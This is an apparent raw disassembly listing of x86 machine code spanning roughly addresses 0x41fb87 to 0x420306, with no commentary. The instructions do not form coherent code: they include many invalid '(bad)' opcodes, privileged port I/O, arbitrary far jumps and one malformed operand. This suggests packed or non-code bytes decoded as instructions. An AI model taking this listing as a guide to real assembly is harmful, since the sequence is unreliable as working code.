  41fb87:	outs   dx,DWORD PTR ds:[esi]
  41fb88:	sub    eax,0x3dc842d
  41fb8d:	hlt    
  41fb8e:	test   BYTE PTR [eax+0x2052a47d],dl
  41fb94:	(bad)  
  41fb95:	pusha  
  41fb96:	stos   DWORD PTR es:[edi],eax
  41fb97:	xchg   edi,eax
  41fb98:	sub    al,0x34
  41fb9a:	pop    edi
  41fb9b:	lahf   
  41fb9c:	pop    es
  41fb9d:	push   esp
  41fb9e:	mov    esp,0x836bf8f8
  41fba3:	cmp    cl,cl
  41fba5:	loope  0x41fb55
  41fba7:	jle    0x41fc1a
  41fba9:	sub    al,0xa2
  41fbab:	ret    0xd7d8
  41fbae:	xchg   eax,ebp
  41fbb0:	cwde   
  41fbb1:	cmc    
  41fbb2:	stos   DWORD PTR es:[edi],eax
  41fbb3:	xchg   esp,eax
  41fbb4:	dec    edi
  41fbb5:	xchg   DWORD PTR [ecx+0x71],edx
  41fbb8:	repnz pop eax
  41fbba:	sub    DWORD PTR [edx+eax*1],eax
  41fbbd:	les    edi,FWORD PTR [edx]
  41fbbf:	or     dl,BYTE PTR [esi-0x27]
  41fbc2:	int    0x56
  41fbc4:	lds    ecx,FWORD PTR [edi+eiz*2+0xebc2566]
  41fbcb:	imul   ebx,DWORD PTR [edi+0x5cf4e1b2],0xc16e33b0
  41fbd5:	mov    ds:0xccc37c45,al
  41fbda:	mov    dl,0xbe
  41fbdc:	jns    0xda01c727
  41fbe2:	jmp    FWORD PTR [edi+0x5e]
  41fbe5:	scas   eax,DWORD PTR es:[edi]
  41fbe6:	stc    
  41fbe7:	jp     0x41fba5
  41fbe9:	arpl   WORD PTR [edx-0x7775b566],bx
  41fbef:	(bad)  
  41fbf0:	fwait
  41fbf1:	mov    eax,0xc97de0b
  41fbf6:	push   cs
  41fbf7:	sahf   
  41fbf8:	out    0x66,al
  41fbfa:	mov    edi,0x58bee1b1
  41fbff:	inc    DWORD PTR [ebx-0x1f9b2c6e]
  41fc05:	out    0x8c,al
  41fc07:	in     al,0x94
  41fc09:	scas   al,BYTE PTR es:[edi]
  41fc0a:	mov    WORD PTR [ebx+esi*1+0x7af00cd9],cs
  41fc11:	and    ebx,ecx
  41fc13:	retf   
  41fc14:	jns    0x41fbbd
  41fc16:	jb     0x181234f4
  41fc1c:	xor    DWORD PTR [edi],eax
  41fc1e:	add    DWORD PTR ds:0x35a0d95f,0xc2711983
  41fc28:	adc    BYTE PTR ds:0x78b59907,dh
  41fc2e:	data16 jl 0x41fc2c
  41fc31:	adc    ebp,eax
  41fc33:	xor    BYTE PTR [edx+eiz*1-0x80],bh
  41fc37:	jno    0x41fbe9
  41fc39:	cld    
  41fc3a:	es loop 0x41fbec
  41fc3d:	mov    dh,0xf4
  41fc3f:	push   es
  41fc40:	push   0x450ba4c3
  41fc45:	inc    ebp
  41fc46:	loop   0x41fc12
  41fc48:	shr    BYTE PTR [edx-0x4a16fcbc],1
  41fc4e:	xor    DWORD PTR [eax],0xce78896b
  41fc54:	into   
  41fc55:	pop    esp
  41fc56:	mov    al,BYTE PTR [edi]
  41fc58:	mov    ds:0x21b695dd,eax
  41fc5d:	cdq    
  41fc5e:	push   ebx
  41fc5f:	pop    es
  41fc60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc61:	test   eax,0xdd1b2b9
  41fc66:	popa   
  41fc67:	out    0xb,eax
  41fc69:	out    0x20,eax
  41fc6b:	repnz mov ax,ds:0x41433d0
  41fc72:	popa   
  41fc73:	(bad)  
  41fc74:	jge    0x41fce1
  41fc76:	jnp    0x41fccb
  41fc78:	(bad)  
  41fc79:	pop    ebx
  41fc7a:	mov    cs,WORD PTR [eax+0x23]
  41fc7d:	mov    DWORD PTR [edx-0x17ac2cab],ebx
  41fc83:	push   0xdeb03dba
  41fc88:	mov    ds:0x6614ba83,eax
  41fc8d:	lods   eax,DWORD PTR ds:[esi]
  41fc8e:	test   BYTE PTR [ebx+0x36],bh
  41fc91:	inc    ecx
  41fc92:	out    dx,eax
  41fc93:	bound  edi,QWORD PTR [eax-0x63]
  41fc96:	repnz dec esp
  41fc98:	js     0x41fc93
  41fc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc9b:	shr    DWORD PTR [eax-0x2c],cl
  41fc9e:	jbe    0x41fc77
  41fca0:	in     eax,dx
  41fca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fca2:	mov    dl,0x30
  41fca4:	dec    edx
  41fca5:	(bad)  
  41fca6:	push   edx
  41fca7:	cld    
  41fca8:	mov    bh,0xc3
  41fcaa:	std    
  41fcab:	push   edx
  41fcac:	pop    ebp
  41fcad:	inc    ebp
  41fcae:	push   ebx
  41fcaf:	sahf   
  41fcb0:	cmp    al,0x20
  41fcb2:	loop   0x41fcbe
  41fcb4:	aad    0x34
  41fcb6:	sbb    DWORD PTR ds:0x348ea721,edi
  41fcbc:	rcl    DWORD PTR [edi+0x74e14448],0xe5
  41fcc3:	test   BYTE PTR [esi],dl
  41fcc5:	and    eax,0x1dcff7a4
  41fcca:	imul   DWORD PTR [ebp+0x6565748a]
  41fcd0:	mov    ds:0x6a4ff768,al
  41fcd5:	add    ebp,esp
  41fcd7:	int3   
  41fcd8:	add    al,0x2d
  41fcda:	and    DWORD PTR [ecx-0x1e10e26c],0x11
  41fce1:	mov    edx,0xaf1a4d01
  41fce6:	jl     0x41fd34
  41fce8:	aam    0xdc
  41fcea:	push   ebp
  41fceb:	lds    eax,FWORD PTR [eax-0x7c47e5b3]
  41fcf1:	jmp    0x192:0xd07ee95e
  41fcf8:	push   eax
  41fcf9:	lods   al,BYTE PTR ds:[esi]
  41fcfa:	push   esp
  41fcfb:	push   0xffffffec
  41fcfd:	call   0x7c3ee47d
  41fd02:	pop    ecx
  41fd03:	mov    BYTE PTR [edx-0x36e5897f],ah
  41fd09:	mov    al,ds:0xb3143bae
  41fd0e:	repz xlat BYTE PTR ds:[ebx]
  41fd10:	rol    ch,1
  41fd12:	cmp    BYTE PTR [ecx+0x77],al
  41fd15:	push   edx
  41fd16:	rol    BYTE PTR [edi-0x19],cl
  41fd19:	stos   BYTE PTR es:[edi],al
  41fd1a:	pop    ebx
  41fd1b:	std    
  41fd1c:	cmp    DWORD PTR [edi+0x11],edi
  41fd1f:	mov    cs,ecx
  41fd21:	arpl   WORD PTR [esi],dx
  41fd23:	aas    
  41fd24:	push   esp
  41fd25:	(bad)  
  41fd28:	out    dx,al
  41fd29:	loopne 0x41fd43
  41fd2b:	push   eax
  41fd2c:	mov    al,ds:0xdd38353b
  41fd31:	cmp    edi,ebx
  41fd33:	dec    eax
  41fd35:	jg     0x41fcc5
  41fd37:	adc    al,0x1f
  41fd39:	inc    edx
  41fd3a:	es data16 fstp st(6)
  41fd3e:	jl     0x41fd12
  41fd40:	push   esi
  41fd41:	jg     0x41fcdf
  41fd43:	jb     0x41fd40
  41fd45:	les    ebx,FWORD PTR [ebx+0x333c6e5]
  41fd4b:	add    ecx,DWORD PTR [ebx-0x4c9e2a20]
  41fd51:	mov    BYTE PTR [ebx+eiz*8-0x4227ad73],cl
  41fd58:	movq   QWORD PTR [edx+0x69],mm2
  41fd5c:	cmp    ebx,edx
  41fd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd5f:	and    eax,0xd59f7318
  41fd65:	mov    esp,0x18364e8e
  41fd6a:	or     eax,0x40c8357c
  41fd6f:	aaa    
  41fd70:	pop    ss
  41fd71:	scas   eax,DWORD PTR es:[edi]
  41fd72:	xor    ebx,ebp
  41fd74:	stos   BYTE PTR es:[edi],al
  41fd75:	mov    esi,0xdf5afb49
  41fd7a:	push   ecx
  41fd7b:	int    0x87
  41fd7d:	jle    0x41fde7
  41fd7f:	mov    edi,0x4aeb95be
  41fd84:	sub    dh,BYTE PTR cs:[ebx]
  41fd87:	dec    edx
  41fd88:	adc    DWORD PTR [edx+0x280c9e95],ebx
  41fd8e:	cmp    ch,BYTE PTR [eax-0x2e]
  41fd91:	bnd jbe 0x41fdcf
  41fd94:	ret    
  41fd95:	sbb    eax,DWORD PTR [ebx+esi*2+0xe075d86]
  41fd9c:	xor    BYTE PTR [eax],0x8b
  41fd9f:	ret    
  41fda0:	xor    DWORD PTR [edi+0x24d4a07],ecx
  41fda6:	mov    ah,0xc9
  41fda8:	dec    esp
  41fda9:	adc    al,0x27
  41fdab:	(bad)  
  41fdac:	stc    
  41fdad:	addr16 daa 
  41fdaf:	and    BYTE PTR [ebx+0xa31494f],bl
  41fdb5:	cmp    BYTE PTR [edx+esi*2+0xadfc054],dh
  41fdbc:	dec    eax
  41fdbd:	dec    edi
  41fdbe:	mov    dh,0xa1
  41fdc0:	ss loop 0x41fdd9
  41fdc3:	xchg   edx,eax
  41fdc4:	out    0x9d,al
  41fdc6:	or     ch,BYTE PTR [ebx+edx*2-0x5f]
  41fdca:	sub    al,BYTE PTR [ecx-0xc4a1673]
  41fdd0:	sub    ecx,0xffffffda
  41fdd3:	push   es
  41fdd4:	retf   
  41fdd5:	cwde   
  41fdd6:	pop    eax
  41fdd7:	mov    BYTE PTR [eax-0x69],0x4f
  41fddb:	adc    DWORD PTR [eax+0x6b],ecx
  41fdde:	outs   dx,BYTE PTR ds:[esi]
  41fddf:	scas   al,BYTE PTR es:[edi]
  41fde0:	adc    BYTE PTR [edx-0x5],0x93
  41fde4:	mov    ds:0x473cc074,al
  41fde9:	sbb    al,0xb8
  41fdeb:	imul   ebp,DWORD PTR [esp+eiz*8-0x26],0xfe776afc
  41fdf3:	in     al,0x70
  41fdf5:	leave  
  41fdf6:	int    0x19
  41fdf8:	or     DWORD PTR [eax+0x6ba10ae2],ebp
  41fdfe:	loopne 0x41fdd6
  41fe00:	mov    ch,0xbb
  41fe02:	xor    ch,dl
  41fe04:	stos   BYTE PTR es:[edi],al
  41fe05:	adc    eax,0x5783c1be
  41fe0a:	and    BYTE PTR [ebx],al
  41fe0c:	xor    eax,0x26d2179
  41fe11:	in     al,dx
  41fe12:	lahf   
  41fe13:	cdq    
  41fe14:	mov    eax,0x3ee4e2a1
  41fe19:	jno    0x41fde3
  41fe1b:	loop   0x41fe6b
  41fe1d:	fistp  DWORD PTR [eax+eax*2]
  41fe20:	fistp  DWORD PTR [eax+edx*8]
  41fe23:	ins    DWORD PTR es:[edi],dx
  41fe24:	sub    BYTE PTR [eax+ebp*1+0x28],bh
  41fe28:	pop    ebx
  41fe29:	and    al,BYTE PTR [esp+edi*2+0x11]
  41fe2d:	add    al,0x5b
  41fe2f:	in     eax,dx
  41fe30:	jge    0x41fe79
  41fe32:	bound  esp,QWORD PTR [ecx-0x63]
  41fe35:	adc    al,0x3b
  41fe37:	xor    DWORD PTR [esi+0x15],0x6e
  41fe3b:	jge    0x41fe8e
  41fe3d:	pop    edx
  41fe3e:	pop    edx
  41fe3f:	mov    bh,0xa3
  41fe41:	std    
  41fe42:	jns    0x41fe1d
  41fe44:	pop    ds
  41fe45:	fisub  DWORD PTR [ecx]
  41fe47:	jmp    0xa4e5ef3b
  41fe4c:	scas   eax,DWORD PTR es:[edi]
  41fe4d:	rcl    DWORD PTR [eax],0x9c
  41fe50:	(bad)  [eax-0x4bca0c07]
  41fe56:	fcomp  DWORD PTR [ebx+0x606f6251]
  41fe5c:	mov    cs,WORD PTR [eax+eiz*1-0x74]
  41fe60:	cli    
  41fe61:	inc    edi
  41fe62:	ins    DWORD PTR es:[edi],dx
  41fe63:	imul   edx,DWORD PTR [edx+0x0],0x70
  41fe67:	xchg   esi,edx
  41fe69:	repz xor BYTE PTR [esi],ch
  41fe6c:	ins    DWORD PTR es:[edi],dx
  41fe6d:	xchg   ebp,eax
  41fe6e:	xor    DWORD PTR [ebx-0x5f6f8c26],0x827c36ed
  41fe78:	adc    BYTE PTR [esi-0x626c6858],0x6e
  41fe7f:	fstp   DWORD PTR [esi-0x1d]
  41fe82:	repnz adc DWORD PTR [eax+eax*2+0x48],edi
  41fe87:	in     eax,0x5e
  41fe89:	pop    esp
  41fe8a:	xchg   edx,eax
  41fe8b:	js     0x41fee8
  41fe8d:	jecxz  0x41fe22
  41fe8f:	cmp    ecx,DWORD PTR [edi+0x14]
  41fe92:	fucomp st(5)
  41fe94:	cmp    BYTE PTR [ebx+eiz*1],0x39
  41fe98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe99:	xchg   edx,esp
  41fe9b:	fmulp  st(3),st
  41fe9d:	ins    BYTE PTR es:[edi],dx
  41fe9e:	or     esp,DWORD PTR ds:0x971a354c
  41fea4:	inc    edi
  41fea5:	and    edi,DWORD PTR [edx+0x30]
  41fea8:	xchg   ebx,eax
  41fea9:	jecxz  0x41ff1d
  41feab:	daa    
  41feac:	in     al,0xb4
  41feae:	mov    edx,0x4b2ec9bb
  41feb3:	(bad)  
  41feb4:	xchg   edx,eax
  41feb5:	loop   0x41fe53
  41feb7:	out    0x94,eax
  41feb9:	inc    eax
  41feba:	sbb    DWORD PTR [edi+esi*2+0x1f3e48fc],ebx
  41fec1:	mov    ah,ah
  41fec3:	int    0x15
  41fec5:	scas   eax,DWORD PTR es:[edi]
  41fec6:	lahf   
  41fec7:	(bad)  
  41fec8:	or     eax,0xffb12357
  41fecd:	stc    
  41fece:	fwait
  41fecf:	popa   
  41fed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fed1:	dec    esi
  41fed2:	xchg   edx,eax
  41fed3:	push   ecx
  41fed4:	inc    eax
  41fed5:	mov    dl,0xfe
  41fed7:	xlat   BYTE PTR ds:[ebx]
  41fed8:	lods   al,BYTE PTR ds:[esi]
  41fed9:	sbb    al,al
  41fedb:	and    bl,BYTE PTR [eax]
  41fedd:	mov    bh,0x4
  41fedf:	jo     0x41fe8f
  41fee1:	mov    esp,0x4d50dd58
  41fee6:	ret    
  41fee7:	pop    es
  41fee8:	call   0xda4e:0x4ba165f6
  41feef:	or     cl,BYTE PTR [edi]
  41fef1:	adc    ebp,esp
  41fef3:	and    DWORD PTR [edi],ebp
  41fef5:	mov    ecx,0xc79e91de
  41fefa:	lea    ebx,[edx-0xa]
  41fefd:	push   eax
  41fefe:	mov    al,0x6
  41ff00:	stos   BYTE PTR es:[edi],al
  41ff01:	ret    0x5233
  41ff04:	retf   
  41ff05:	inc    ecx
  41ff06:	inc    esp
  41ff07:	pop    ds
  41ff08:	mov    WORD PTR [ecx],es
  41ff0a:	repnz xlat BYTE PTR ds:[ebx]
  41ff0c:	push   0xb179bd9
  41ff11:	push   ds
  41ff12:	arpl   WORD PTR ss:[edx+0x6b904f68],sp
  41ff19:	xchg   esi,eax
  41ff1a:	outs   dx,DWORD PTR ds:[esi]
  41ff1b:	cdq    
  41ff1c:	xchg   ebp,eax
  41ff1d:	pop    edx
  41ff1e:	sti    
  41ff1f:	adc    al,0xc3
  41ff21:	mov    ch,0x34
  41ff23:	jmp    0x60d646f9
  41ff28:	cmp    ecx,ebp
  41ff2a:	pop    edi
  41ff2b:	pop    ebp
  41ff2c:	(bad)  [edx+ecx*8-0x7a]
  41ff30:	ror    BYTE PTR [esi],0x33
  41ff33:	mov    edx,0xff15f0ff
  41ff38:	sar    ch,1
  41ff3a:	push   ss
  41ff3b:	mov    dl,0x62
  41ff3d:	in     al,dx
  41ff3e:	inc    esp
  41ff3f:	aad    0x0
  41ff41:	dec    edx
  41ff42:	or     ah,BYTE PTR [eax-0x50]
  41ff45:	push   cs
  41ff46:	cmp    BYTE PTR [eax-0x3f478424],dh
  41ff4c:	jle    0x41ff02
  41ff4e:	les    edx,FWORD PTR [ecx+0x262dc366]
  41ff54:	mov    es,WORD PTR [ecx+ebx*1-0x505f337d]
  41ff5b:	jecxz  0x41fee2
  41ff5d:	fcmovne st,st(3)
  41ff5f:	ja     0x41fee5
  41ff61:	pusha  
  41ff62:	stos   DWORD PTR es:[edi],eax
  41ff63:	or     BYTE PTR [esi-0x58],dl
  41ff66:	push   es
  41ff67:	imul   esp,DWORD PTR [edx],0x5e
  41ff6a:	and    ch,ah
  41ff6c:	jg     0x41ff9b
  41ff6e:	call   0x51da4e9f
  41ff73:	into   
  41ff74:	(bad)  
  41ff76:	cmp    dl,dh
  41ff78:	dec    eax
  41ff79:	ins    DWORD PTR es:[edi],dx
  41ff7a:	sub    al,0xd1
  41ff7c:	outs   dx,BYTE PTR ds:[esi]
  41ff7d:	pop    ds
  41ff7e:	test   DWORD PTR [edx-0x313de32d],eax
  41ff84:	xchg   DWORD PTR [esi+0x54],ebx
  41ff87:	mov    bh,0x11
  41ff89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff8a:	stc    
  41ff8b:	popa   
  41ff8c:	and    al,0x18
  41ff8e:	sub    edx,DWORD PTR [edx+0xcccb489]
  41ff94:	inc    ecx
  41ff95:	sbb    DWORD PTR [esi],0x1c
  41ff98:	adc    esp,esi
  41ff9a:	mov    eax,ds:0x4fa8cfc7
  41ff9f:	push   ebx
  41ffa0:	xchg   edx,eax
  41ffa1:	adc    eax,0x39eedaac
  41ffa6:	arpl   WORD PTR [ecx+0x53],bx
  41ffa9:	scas   eax,DWORD PTR es:[edi]
  41ffaa:	fisubr DWORD PTR [eax]
  41ffac:	cmp    al,0xa6
  41ffae:	es inc ecx
  41ffb0:	pusha  
  41ffb1:	inc    esp
  41ffb2:	test   al,0xeb
  41ffb4:	or     cl,dl
  41ffb6:	xchg   edx,eax
  41ffb7:	pop    eax
  41ffb8:	in     al,dx
  41ffb9:	lds    ecx,FWORD PTR ds:0x81727575
  41ffbf:	(bad)  
  41ffc0:	jo     0x41ffbe
  41ffc2:	jne    0x41ff54
  41ffc4:	fcmovb st,st(7)
  41ffc6:	out    0xcb,al
  41ffc8:	(bad)  
  41ffc9:	bnd je 0x420009
  41ffcc:	into   
  41ffcd:	addr16 hlt 
  41ffcf:	sbb    DWORD PTR [edi+ecx*8],ebx
  41ffd2:	mov    edi,0xf700af6e
  41ffd7:	and    BYTE PTR [ecx-0x4448201a],dl
  41ffdd:	out    dx,eax
  41ffde:	loope  0x41ff75
  41ffe0:	or     bh,BYTE PTR [edi+0x792638b]
  41ffe6:	cmc    
  41ffe7:	pop    es
  41ffe8:	mov    edx,0xa4203530
  41ffed:	out    0xd1,eax
  41ffef:	add    ch,BYTE PTR es:[esi+edi*1+0x53]
  41fff4:	outs   dx,BYTE PTR ds:[esi]
  41fff5:	or     BYTE PTR [esi+0x58],bh
  41fff8:	jb     0x420058
  41fffa:	mov    ds:0x208b3587,eax
  41ffff:	(bad)  
  420000:	aaa    
  420001:	xchg   BYTE PTR [ebx],bh
  420003:	repnz lock gs leave 
  420007:	outs   dx,BYTE PTR ds:[esi]
  420008:	add    eax,0x196b5091
  42000d:	mov    edx,0x4220278d
  420012:	imul   ebp,DWORD PTR [eax-0x16],0x21
  420016:	mov    bh,0x98
  420018:	dec    esp
  420019:	int3   
  42001a:	cdq    
  42001b:	pop    ss
  42001c:	push   edx
  42001d:	mov    ebx,0xdf89431b
  420022:	dec    ecx
  420023:	loopne 0x42001e
  420025:	add    bl,bl
  420027:	call   DWORD PTR [ebp-0x31]
  42002a:	inc    eax
  42002b:	test   al,0xb8
  42002d:	mov    ds:0xf1dc959f,al
  420032:	mov    edi,?
  420034:	adc    DWORD PTR [esp+eiz*4+0x39],edx
  420038:	inc    ebx
  420039:	dec    edx
  42003a:	mov    edi,0x404d539a
  42003f:	(bad)  
  420040:	call   0xf5fc4bfb
  420045:	or     BYTE PTR [ebx],dl
  420047:	int3   
  420048:	push   DWORD PTR [edx+0x7694c67b]
  42004e:	dec    ecx
  42004f:	xchg   edi,eax
  420050:	add    DWORD PTR [ebx],0xbda40f55
  420056:	adc    BYTE PTR [eax+0x53],ch
  420059:	dec    ebp
  42005a:	push   edx
  42005b:	sbb    ch,bl
  42005d:	pushf  
  42005e:	xor    ecx,DWORD PTR [edx]
  420060:	add    bh,BYTE PTR [ecx]
  420062:	jae    0x42001a
  420064:	push   es
  420065:	and    dh,BYTE PTR [esi+0x3173206e]
  42006b:	xlat   BYTE PTR ds:[ebx]
  42006c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42006d:	dec    edx
  42006e:	xor    al,0x67
  420070:	sbb    al,0x37
  420072:	inc    ecx
  420073:	out    0xbd,eax
  420075:	cli    
  420076:	loopne 0x420064
  420078:	aad    0xc4
  42007a:	ret    
  42007b:	sub    ch,cl
  42007d:	mov    ds:0xc06c2240,al
  420082:	stos   DWORD PTR es:[edi],eax
  420083:	push   0xa5f77de1
  420088:	mov    dh,0x11
  42008a:	and    al,0xdf
  42008c:	inc    esi
  42008d:	(bad)  
  42008f:	add    al,0x21
  420091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420092:	push   ds
  420093:	lahf   
  420094:	icebp  
  420095:	bound  edi,QWORD PTR [esi-0xe]
  420098:	and    DWORD PTR [ebp+0x4d],esp
  42009b:	popa   
  42009c:	sbb    esp,esp
  42009e:	ja     0x420021
  4200a0:	clc    
  4200a1:	aas    
  4200a2:	push   ecx
  4200a3:	stc    
  4200a4:	xchg   edx,eax
  4200a5:	add    al,0xd0
  4200a7:	mov    esp,DWORD PTR [ecx]
  4200a9:	stos   BYTE PTR es:[edi],al
  4200aa:	jbe    0x4200f8
  4200ac:	in     al,dx
  4200ad:	jge    0x420117
  4200af:	pop    ds
  4200b0:	ret    0x883b
  4200b3:	jb     0x42009b
  4200b5:	int3   
  4200b6:	sar    BYTE PTR ds:[esi-0x66],cl
  4200ba:	pop    ds
  4200bb:	ror    DWORD PTR [ebx-0x5f],1
  4200be:	sbb    BYTE PTR [edx+0x18cfa8c8],dl
  4200c4:	add    eax,0x51d9c2d3
  4200c9:	lods   al,BYTE PTR ds:[esi]
  4200ca:	mov    dh,0x30
  4200cc:	mov    dl,BYTE PTR [esi]
  4200ce:	repz sub BYTE PTR [edx-0x10e83c30],0x38
  4200d6:	fs clc 
  4200d8:	mov    esp,0x923b0bee
  4200dd:	mov    al,0x9c
  4200df:	jbe    0x420080
  4200e1:	jmp    0x4200de
  4200e3:	fucomp st(4)
  4200e5:	add    eax,0x219792ae
  4200ea:	leave  
  4200eb:	xchg   ebp,eax
  4200ec:	in     eax,0xa
  4200ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200ef:	stos   DWORD PTR es:[edi],eax
  4200f0:	mov    esi,0x5e76d12
  4200f5:	xor    BYTE PTR [eax-0x7f43f348],bl
  4200fb:	fstp   TBYTE PTR [ebp-0x1d142510]
  420101:	jl     0x42017b
  420103:	push   es
  420104:	imul   ebx,DWORD PTR [eax],0xffffff89
  420107:	sbb    eax,0xaf4b1bf7
  42010c:	mov    esp,0x6d068454
  420111:	jo     0x42010e
  420113:	add    edx,esp
  420115:	ret    
  420116:	mov    bh,0xd7
  420118:	cli    
  420119:	mov    edx,0x69e9fe9b
  42011e:	sub    eax,0xcf45c22f
  420123:	call   0xf6f6:0x17926b05
  42012a:	in     eax,dx
  42012b:	mov    edi,0xefb73f06
  420130:	int3   
  420131:	add    eax,0x1c9d66ae
  420136:	pop    ds
  420137:	mov    edi,0x888ddaba
  42013c:	sbb    bl,BYTE PTR [edi]
  42013e:	ret    0x771d
  420141:	cmc    
  420142:	retf   
  420143:	arpl   WORD PTR [edi-0x2e1758f9],cx
  420149:	test   DWORD PTR [ebp+0x77],edx
  42014c:	fst    QWORD PTR [ecx-0x69]
  42014f:	(bad)  
  420150:	or     ah,BYTE PTR [edx]
  420152:	fs pop ebp
  420154:	gs nop
  420156:	mul    DWORD PTR [esi-0x5]
  420159:	xchg   esp,eax
  42015a:	push   cs
  42015b:	push   edx
  42015c:	repnz mov ecx,0x2d69ff49
  420162:	add    al,0xa7
  420164:	jb     0x420191
  420166:	push   ecx
  420167:	pop    ss
  420168:	fisub  WORD PTR [esi]
  42016a:	cmp    BYTE PTR [eax-0x73],0x8a
  42016e:	bound  eax,QWORD PTR [edx]
  420170:	loop   0x4200ff
  420172:	loop   0x42012e
  420174:	call   0xd1c3:0x9deecd59
  42017b:	push   esi
  42017c:	ins    DWORD PTR es:[edi],dx
  42017d:	inc    ebx
  42017e:	adc    DWORD PTR [ecx+0x56],ecx
  420181:	push   edx
  420182:	test   BYTE PTR [edx-0x31],dh
  420185:	xor    DWORD PTR [ebx+edi*1],esi
  420188:	mov    eax,0xd4906f81
  42018d:	push   esp
  42018e:	cmp    DWORD PTR [eax+0x2e75c757],esi
  420194:	xchg   edi,eax
  420195:	imul   ebp,DWORD PTR [edx],0xb09c54b3
  42019b:	push   esi
  42019c:	xchg   ecx,eax
  42019d:	cwde   
  42019e:	popa   
  42019f:	xor    DWORD PTR [edx+0x3e3af154],0xf
  4201a6:	xchg   esp,eax
  4201a7:	lods   eax,DWORD PTR ds:[esi]
  4201a8:	and    ch,ah
  4201aa:	shr    DWORD PTR [ebx],cl
  4201ac:	lock xchg edx,eax
  4201ae:	sbb    DWORD PTR [eax-0x21ca8e22],eax
  4201b4:	jo     0x420204
  4201b6:	scas   eax,DWORD PTR es:[edi]
  4201b7:	ds mov eax,0xf98f1900
  4201bd:	je     0x4201ec
  4201bf:	xor    eax,edx
  4201c1:	mov    ebx,0xb17186bd
  4201c6:	bound  ecx,QWORD PTR [edi+eax*1-0x24]
  4201ca:	jbe    0x42020c
  4201cc:	jbe    0x420186
  4201ce:	outs   dx,DWORD PTR ds:[esi]
  4201cf:	cld    
  4201d0:	scas   al,BYTE PTR es:[edi]
  4201d1:	call   0xb9b9:0x7e30e697
  4201d8:	dec    ebx
  4201d9:	sub    DWORD PTR [ecx-0x161ca63d],edi
  4201df:	loop   0x42016a
  4201e1:	add    al,bl
  4201e3:	and    eax,0x8b70cf73
  4201e8:	adc    eax,0xdee6cabc
  4201ed:	sahf   
  4201ee:	inc    edx
  4201ef:	sub    eax,0x8a71a5d4
  4201f4:	push   cs
  4201f5:	mov    ah,0x47
  4201f7:	mov    ebx,0xd03a70ec
  4201fc:	jae    0x4201bd
  4201fe:	xchg   ebp,eax
  4201ff:	(bad)
  420202:	xchg   ecx,eax
  420203:	je     0x420232
  420205:	mov    cl,bl
  420207:	ds push ebx
  420209:	push   edx
  42020a:	(bad)  
  42020b:	lea    ebp,[ecx+0xb]
  42020e:	fadd   QWORD PTR ss:[esi]
  420211:	jmp    0x42022b
  420213:	push   edx
  420214:	or     DWORD PTR [edx+0x39],ecx
  420217:	cmp    ecx,DWORD PTR [ebx+0x3c]
  42021a:	jecxz  0x420268
  42021c:	arpl   WORD PTR [esi+0x6d0ed870],di
  420222:	xchg   edx,eax
  420223:	pop    esi
  420224:	sbb    al,0x2c
  420226:	fnsave [edx]
  420228:	mov    ds:0xd89a5f90,al
  42022d:	sbb    al,0x40
  42022f:	jae    0x420250
  420231:	cmp    bl,bh
  420233:	sub    eax,ecx
  420235:	mov    dh,0x75
  420237:	retf   
  420238:	daa    
  420239:	fld    QWORD PTR [edi+esi*4+0x63ec081e]
  420240:	cdq    
  420241:	cld    
  420242:	cmc    
  420243:	add    DWORD PTR [eax-0x23],ebx
  420246:	dec    eax
  420247:	sub    eax,0x6bffb572
  42024c:	add    DWORD PTR [eax+0x461eec01],0x310b16ce
  420256:	test   DWORD PTR [eax-0x15],eax
  420259:	inc    ebp
  42025a:	sub    esp,DWORD PTR [esi-0x6f]
  42025d:	inc    esp
  42025e:	inc    eax
  42025f:	xor    al,0xf8
  420261:	cmp    DWORD PTR [ebp-0x1a],ebx
  420264:	push   edx
  420265:	jg     0x4201f9
  420267:	out    0x61,eax
  420269:	or     cl,dh
  42026b:	fwait
  42026c:	lds    edi,FWORD PTR [ecx-0x8a84fde]
  420272:	push   0x5fca2759
  420277:	repnz std 
  420279:	outs   dx,DWORD PTR ds:[esi]
  42027a:	outs   dx,BYTE PTR ds:[esi]
  42027b:	cwde   
  42027c:	inc    edx
  42027d:	add    cl,ah
  42027f:	fisttp QWORD PTR [edi+edi*8+0x3b6e9a4d]
  420286:	ret    0x92fd
  420289:	xchg   edx,eax
  42028a:	sub    edi,DWORD PTR [ecx]
  42028c:	or     BYTE PTR [eax+0x5a4cc3a6],bh
  420292:	mov    ch,0x3d
  420294:	mov    ds:0x36f8b74a,al
  420299:	adc    esp,DWORD PTR ss:[ecx-0x6aaa2281]
  4202a0:	fcomi  st,st(5)
  4202a2:	xchg   esi,eax
  4202a3:	jl     0x4202a9
  4202a5:	arpl   WORD PTR es:[ecx-0x16e79e69],bp
  4202ac:	sub    eax,0x768ba2ec
  4202b1:	test   al,0x33
  4202b3:	or     DWORD PTR [esi-0x7177092c],edx
  4202b9:	out    dx,al
  4202ba:	enter  0x9aa0,0xeb
  4202be:	daa    
  4202bf:	or     edx,DWORD PTR [edi+eax*4]
  4202c2:	inc    ecx
  4202c3:	xor    BYTE PTR [ebp+0x0],0x41
  4202c7:	into   
  4202c8:	call   0xa4f573f4
  4202cd:	fsub   QWORD PTR [ebx-0x5b]
  4202d0:	pop    ebp
  4202d1:	lea    esp,gs:[ecx-0x4f]
  4202d5:	adc    ecx,DWORD PTR [edi+0x1c]
  4202d8:	pop    ebx
  4202d9:	sub    cx,WORD PTR [edi-0x6c]
  4202dd:	mov    ebp,0x5b15d2ca
  4202e2:	push   ds
  4202e3:	xchg   edi,eax
  4202e4:	add    DWORD PTR [ecx],0x7ad9d159
  4202ea:	push   0xffffffb9
  4202ec:	fld    TBYTE PTR [edx+0x2cd35c8b]
  4202f2:	(bad)  
  4202f3:	xor    dh,BYTE PTR [edi]
  4202f5:	jmp    0x9e12:0xe2ce1e56
  4202fc:	fstp   QWORD PTR [eax-0x67]
  4202ff:	push   ebp
  420300:	sub    eax,0x4aae7e8
  420305:	out    dx,eax
  420306:	jne    0x420327
